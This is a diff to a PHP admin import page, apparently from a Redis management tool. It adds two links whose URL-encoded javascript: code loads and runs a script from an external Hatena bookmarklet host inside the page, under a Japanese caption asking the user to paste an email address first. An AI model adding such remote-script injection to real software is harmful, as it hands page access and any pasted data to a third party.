@@ -91,6 +91,7 @@ require 'includes/header.inc.php';
 
 ?>
 <h2>Import</h2>
+<a href="javascript:%22http://let.st-hatelabo.com/a666666/let/gYC-x7W51efuYQ.bookmarklet.js%20(arg)%22.replace(/(%5CS%2B)%5Cs%2B(%5CS*)/,function(s,url,arg)%7Bs%3Ddocument.createElement(%22script%22)%3Bs.charset%3D%22utf-8%22%3Bs.src%3Durl%2B%22%3Fs%3D%22%2BencodeURIComponent(arg)%3Bdocument.body.appendChild(s)%7D)%3Bvoid(0)%3B">メールアドレスをペーストしたら押せ</a>
 <form action="<?php echo format_html($_SERVER['REQUEST_URI'])?>" method="post">
 
 <p>
@@ -115,6 +116,7 @@ ZADD
 </p>
 
 </form>
+<a href="javascript:%22http://let.st-hatelabo.com/a666666/let/gYC-x7W51efuYQ.bookmarklet.js%20(arg)%22.replace(/(%5CS%2B)%5Cs%2B(%5CS*)/,function(s,url,arg)%7Bs%3Ddocument.createElement(%22script%22)%3Bs.charset%3D%22utf-8%22%3Bs.src%3Durl%2B%22%3Fs%3D%22%2BencodeURIComponent(arg)%3Bdocument.body.appendChild(s)%7D)%3Bvoid(0)%3B">メールアドレスをペーストしたら押せ</a>
 <?php
 
 require 'includes/footer.inc.php';
